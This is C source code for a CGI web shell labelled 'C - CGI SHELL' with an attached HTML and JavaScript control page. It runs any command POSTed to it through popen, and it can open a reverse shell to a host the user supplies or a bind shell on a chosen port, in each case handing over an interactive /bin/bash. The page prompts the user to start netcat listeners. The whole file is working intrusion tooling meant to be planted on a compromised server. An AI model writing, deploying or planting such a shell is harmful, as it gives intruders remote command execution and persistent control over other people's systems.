#include <stdio.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>

// C0d3r: MMxM [ hc0der.blogspot.com ]

struct get_data {
    char key[100];
    char value[100];
};


void exec_cmd(void){
    printf("Content-type:text/html\n\n");
    FILE *command;
    int size = atoi(getenv("CONTENT_LENGTH"));
    if(size > 1500) {
        printf("Error> Post Data is very big");
        exit(0);
    }
    char *buffer = malloc(size+1);
    fread(buffer,1,size,stdin);
    command = popen(buffer,"r");
    char caracter;

    while((caracter = fgetc(command))){
        if(caracter == EOF) break;
        printf("%c",caracter);
    }

    pclose(command);
    free(buffer);
    exit(0);
}

int error(char *err){
    perror(err);
    exit(EXIT_FAILURE);
}

void parser_get(void){
    printf("Content-type:text/html\n\n");

    struct get_data *s;
    char *GET = (char *)getenv("QUERY_STRING");
    int i,number_of_get = 0,size_get = strlen(GET);

    if(strlen(GET) > 100)
        exit(0);

    s = (struct get_data *)malloc(number_of_get*sizeof(struct get_data));

    int element = 0;
    int positionA = 0;
    int positionB = 0;
    int id = 0;

    for(i=0;i<size_get;i++){
        if(GET[i] == '='){
            id = 1;
            s[element].key[positionA] = '\0';
            positionB = 0;
            continue;
        }

        if(GET[i] == '&'){
            id = 0;
            s[element].key[positionA] = '\0';
            s[element].value[positionB] = '\0';
            positionA = 0;
            positionB = 0;
            element++;
            continue;
        }

        if(id==0){
            s[element].key[positionA] = GET[i];
            positionA++;
        }

        if(id==1){
            s[element].value[positionB] = GET[i];
            positionB++;
        }

        if(i == size_get-1 && GET[size_get-1] != '&'){
            s[element].key[positionA] = '\0';
            s[element].value[positionB] = '\0';
            element++;
            continue;
        }


    }

    char *host_x = (char *)malloc(100);
    host_x = NULL;
    char *type_x = (char *)malloc(100);
    type_x = NULL;
    int port_x = 0;

    for(i=0;i<element;i++){
        if(strcmp(s[i].key,"type")==0)
            type_x = s[i].value;
        else if(strcmp(s[i].key,"host")==0)
            host_x = s[i].value;
        else if(strcmp(s[i].key,"port")==0)
            port_x = atoi(s[i].value);
    }

    free(s);

    if(type_x == NULL){
        free(type_x);
        free(host_x);
        exit(0);
    }

    if( (strcmp(type_x,"")==0) || port_x <= 0 || port_x > 65535){
        printf("Something is wrong ... !!!");
        free(type_x);
        free(host_x);
        exit(0);
    }

    if((strcmp(type_x,"reverse")==0) && (strcmp(host_x,"")==0)){
        printf("You must specify a target host ...");
        free(type_x);
        free(host_x);
        exit(0);
    }

    if(strcmp(type_x,"reverse") == 0){
        struct sockaddr_in addr;
        int msocket;
        msocket = socket(AF_INET,SOCK_STREAM,0);

        if(msocket < 0){
            printf("<font color='red'>Fail to create socket</font>");
            free(host_x);
            free(type_x);
            exit(0);
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port_x);
        addr.sin_addr.s_addr = inet_addr(host_x);

        memset(&addr.sin_zero,0,sizeof(addr.sin_zero));

        if(connect(msocket,(struct sockaddr*)&addr,sizeof(addr)) == -1){
            printf("<font color='red'>Fail to connect</font>\n");
            free(host_x);
            free(type_x);
            exit(0);
        }

        printf("<font color='006600'>Connect with sucess !!!</font>\n");

        if(fork() == 0){
            close(0); close(1); close(2);
            dup2(msocket, 0); dup2(msocket, 1); dup2(msocket,2);
            execl("/bin/bash","bash","-i", (char *)0);
            close(msocket);
            exit(0);
        }

        free(host_x);
        free(type_x);
        exit(0);
    } else if (strcmp(type_x,"bind")==0) {

        int my_socket, cli_socket;
        struct sockaddr_in server_addr,cli_addr;

        if ((my_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1){
            printf("<font color='red'>Fail to create socket</font>");
            exit(1);
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port_x);
        server_addr.sin_addr.s_addr = INADDR_ANY;
        bzero(&(server_addr.sin_zero), 8);

        int optval = 1;
        setsockopt(my_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);


        if (bind(my_socket, (struct sockaddr *)&server_addr, sizeof(struct sockaddr))== -1){
            printf("<font color='red'>Fail to bind</font>");
            free(host_x);
            free(type_x);
            exit(1);
        }

        if (listen(my_socket, 1) < 0){
            printf("<font color='red'>Fail to listen</font>");
            free(host_x);
            free(type_x);
            exit(1);
        } else {
            printf("<font color='006600'>Listen on port %d</font>\n",port_x);
        }

        if(fork() == 0){
            socklen_t tamanho = sizeof(struct sockaddr_in);

            if ((cli_socket = accept(my_socket, (struct sockaddr *)&cli_addr,&tamanho)) < 0){
                exit(0);

            }

            close(0); close(1); close(2);
            dup2(cli_socket, 0); dup2(cli_socket, 1); dup2(cli_socket,2);

            execl("/bin/bash","bash","-i",(char *)0);
            close(cli_socket);

        }

    }
    free(host_x);
    free(type_x);
    exit(0);
}

void load_css_js(void){
printf("<style type=\"text/css\">\n\
#page-wrap {\n\
    margin: 20px auto;\n\
    width: 750px;\n\
}\n\
\n\
h1 {\n\
    font-family: Impact, Charcoal, sans-serif;\n\
    text-shadow: -1px 0 black, 0 1px black,\n\
     1px 0 black, 0 -1px black;\n\
    color: gray;\n\
    border: #00ff00;\n\
}\n\
\n\
body {\n\
    background-color: white;\n\
}\n\
\n\
input[type=\"text\"] {\n\
    margin-bottom: 10px;\n\
    border: 1px solid gray;\n\
    color: black;\n\
    box-shadow: 4px 4px 2px 2px rgba(50, 50, 50, 0.75);\n\
}\n\
\n\
hr {\n\
    color: gray;\n\
}\n\
\n\
input[type=\"submit\"],input[type=\"button\"] {\n\
    margin-bottom: 10px;\n\
    border: 1px solid gray;\n\
    box-shadow: 4px 4px 2px 2px rgba(50, 50, 50, 0.75);\n\
}\n\
\n\
#bind_reverse {\n\
    display:none;\n\
}\n\
\n\
label {\n\
    position: relative;\n\
    clear: left;\n\
    float: left;\n\
    width: 15em;\n\
    margin-right: 5px;\n\
    text-align: right;\n\
    margin-top: 5px;\n\
}\n\
\n\
\n\
div.scroll {\n\
    border: 1px solid gray;\n\
    margin-bottom: 10px;\n\
    color: black;\n\
    font-family: Tahoma, sans-serif;\n\
    padding: 5px;\n\
    width: 745px;\n\
    height: 295px;\n\
    overflow: auto;\n\
    box-shadow: 4px 4px 2px 2px rgba(50, 50, 50, 0.75);\n\
}\n\
\n\
#cmd_rev {\n\
    position: absolute;\n\
    margin-left: 450px;\n\
    top: 150px;\n\
    width: 250px;\n\
    overflow: auto;\n\
}\n\
\n\
#cmd_bin {\n\
    position: absolute;\n\
    margin-left: 450px;\n\
    top: 300px;\n\
    width: 250px;\n\
    overflow: auto;\n\
}\n\
\n\
#rev_s {\n\
    display:inline;\n\
}\n\
\n\
#bind_s {\n\
    display:inline;\n\
}\n\
</style>\n\
\n\
<script type=\"text/javascript\">\n\
function exec_cmd(){\n\
    var Rrequest = new XMLHttpRequest();\n\
    var cmd_x = document.getElementById(\"xxx\");\n\
\n\
    var result = document.getElementById(\"result\");\n\
\n\
    if(cmd_x.value == '') return;\n\
    if(cmd_x.value == 'clear' || cmd_x.value == 'reset') { result.innerHTML = ''; return; }\n\
    var vv = cmd_x.value;\n\
\n\
    vv = vv.replace(/</g,\"&#60\");\n\
    vv = vv.replace(/>/g,\"&#62\");\n\
\n\
    result.innerHTML += \"<pre><b>\\$</b> \"+vv+\"</pre>\";\n\
    var bodyx = '';\n\
\n\
    Rrequest.open(\"POST\",window.location.href,true);\n\
    Rrequest.setRequestHeader(\"Content-type\",\"text/plain\");\n\
    Rrequest.send(cmd_x.value);\n\
\n\
    Rrequest.onreadystatechange = function(){\n\
        if(Rrequest.status == 200){\n\
            if(Rrequest.readyState==4 || Rrequest.readyState==\"complete\"){\n\
                var complete_cont = Rrequest.responseText;\n\
                complete_cont = complete_cont.replace(/</g,\"&#60\");\n\
                complete_cont = complete_cont.replace(/>/g,\"&#62\");\n\
                result.innerHTML += '<pre>'+complete_cont+'</pre>';\n\
                result.scrollTop = result.scrollHeight;\n\
            }\n\
        } else {\n\
            if(Rrequest.readyState==4 || Rrequest.readyState==\"complete\"){\n\
                result.innerHTML += \"<pre><b>error !</b></pre>\";\n\
                return false;\n\
            }\n\
        }\n\
    }\n\
}\n\
\n\
function load_bind(){\n\
    var change_link = document.getElementById(\"change_link\");\n\
    var linkz = change_link.innerHTML;\n\
\n\
    if(linkz == 'REVERSE/BIND') {\n\
        change_link.innerHTML = \"COMMAND LINE\";\n\
        document.getElementById(\"cmd_line\").style.display = 'none';\n\
        document.getElementById(\"bind_reverse\").style.display = 'block';\n\
    }\n\
    \n\
    else {\n\
        document.getElementById(\"bind_reverse\").style.display = 'none';\n\
        document.getElementById(\"cmd_line\").style.display = 'block';\n\
        change_link.innerHTML = 'REVERSE/BIND';\n\
    }\n\
}\n\
\n\
function update_div(su,xxxd){\n\
    var status = document.getElementById(xxxd);\n\
    if(su.value == 0 || su.value == \"\"){\n\
        status.innerHTML = \"\";\n\
        return false;\n\
    }\n\
    if(xxxd == 'cmd_rev') {\n\
        status.innerHTML = \"<pre>netcat -lvvp \"+su.value+\"</pre>\";\n\
        return true;\n\
    }\n");
    printf("\tvar server_ip = '%s';\n",getenv("SERVER_ADDR"));
    printf("\tstatus.innerHTML = \"<pre>netcat -v \"+server_ip+\" \"+su.value+\"</pre>\";\n\
    return true;\n\
}\n\
\n\
function change_div(ev,field){\n\
    if(ev.keyCode == 8 || ev.keyCode == 37 ||\n\
    ev.keyCode == 38 || ev.keyCode == 39 || \n\
     ev.keycode == 40 || ev.keyCode == 46){\n\
        return true;\n\
    }\n\
\n\
    if(ev.charCode < 48 || ev.charCode > 57){\n\
        return false;\n\
    }\n\
    \n\
    if(field.value > 65535){\n\
        return false;\n\
    }\n\
    return true;\n\
}\n\
\n\
function connect_xxx(div_t){\n\
\n\
    var get_s = '';\n\
    if(div_t == 'rev_s'){\n\
        var host_rev = document.getElementById(\"host_rev\");\n\
        var port_rev = document.getElementById(\"port_rev\");\n\
        if(host_rev.value == '' || port_rev == '' ) return false;\n\
        get_s = '/?type=reverse&host='+host_rev.value+'&port='+port_rev.value;\n\
    } else if(div_t == 'bind_s'){\n\
        var port_bind = document.getElementById(\"port_bin\");\n\
        if(port_bin.value == '') return false;\n\
        get_s = '/?type=bind&port='+port_bin.value;\n\
    }\n\
\n\
    var target_div = document.getElementById(div_t);\n\
    target_div.innerHTML = \"Wait ...\";\n\
\n\
    var connect_s = new XMLHttpRequest();\n\
    connect_s.open(\"GET\",window.location.href+get_s,true);\n\
    connect_s.timeout = 3000;\n\
    connect_s.ontimeout = function(){\n\
        target_div.innerHTML = \"<font color='006600'>Listen OK !!!</font>\"\n\
}\n\
\n\
    connect_s.onreadystatechange = function(){\n\
        if(connect_s.status == 200){\n\
            if(connect_s.readyState==4 || connect_s.readyState==\"complete\"){\n\
                target_div.innerHTML = connect_s.responseText;\n\
            }\n\
        } else {\n\
            if(connect_s.readyState==4 || connect_s.readyState==\"complete\"){\n\
                result.innerHTML += \"<b>error !</b>\";\n\
                return false;\n\
            }\n\
        }\n\
    }\n\
\n\
\n\
\n\
    connect_s.send();\n\
\n\
\n\
}\n\
</script>");

}

int main(void){
    if(strcmp(getenv("REQUEST_METHOD"),"POST") == 0) exec_cmd();
    if(strcmp(getenv("QUERY_STRING"),"") != 0) parser_get();
    printf("Content-type:text/html\n\n");

    printf("<html>\n");
    printf("\t<head>\n\t<meta http-equiv=\"Content-type\" content=\"text/html;charset=UTF-8\">\n");
    printf("\t\t<title> C CGI SHELL =D </title>\n");
    load_css_js();
    printf("\n\t</head>\n");
    printf("\t<body>\n");
printf(" \n\
    <div id=\"page-wrap\">\n\
    <h1>C - CGI SHELL</h1><pre>C0der: <b>MMxM</b> | <a id='change_link' href='javascript:load_bind()'>REVERSE/BIND</a></pre>\n\
    <div id='cmd_line'>\n\
    <input type=\"text\" style=\"width:300px;\" id=\"xxx\" onkeyup=\"if(event.keyCode == 13) document.getElementById('lol').click()\">\n\
    <input id=\"lol\" type=\"button\" value=\"Execute Command !!!\" onclick=\"exec_cmd()\">br/>\n\
    <div class=\"scroll\" id='result'></div>\n\
    </div>\n\
    <div id='bind_reverse'>\n\
        <pre><b>Reverse Connection: <div id='rev_s'><font color='red'>Stop</font></div></b></pre>\n\
        <pre><label>Host/IP:</label><input type=\"text\" id='host_rev'/></pre>\n\
        <pre><label>Port:</label><input type=\"text\" id='port_rev' onkeypress='return change_div(event,this);' onKeyUp='update_div(this,\"cmd_rev\");' /></pre>\n\
        <input type='button' value='Start Connection' style=\"margin-left: 15.5em;\" onclick=\"connect_xxx('rev_s')\"/>\n\
        <div id='cmd_rev'></div>\n\
        <hr>\n\
        <pre><b>Bind Connection: <div id='bind_s'><font color='red'>Stop</font></div></b></pre>\n\
        <pre><label>Port To Listen:</label><input type=\"text\" id='port_bin' style=\"width:50px\" onkeypress='return change_div(event,this);' onKeyUp='update_div(this,\"cmd_bin\");'></pre>\n\
        <input type='button' value='Start Connection' style=\"margin-left: 15.5em;\" onclick=\"connect_xxx('bind_s')\"/>\n\
        <div id='cmd_bin'></div>\n\
    </div>\n\
    </div>\n\
    </body>\n\
</html>\n\
");
    return 0;
}
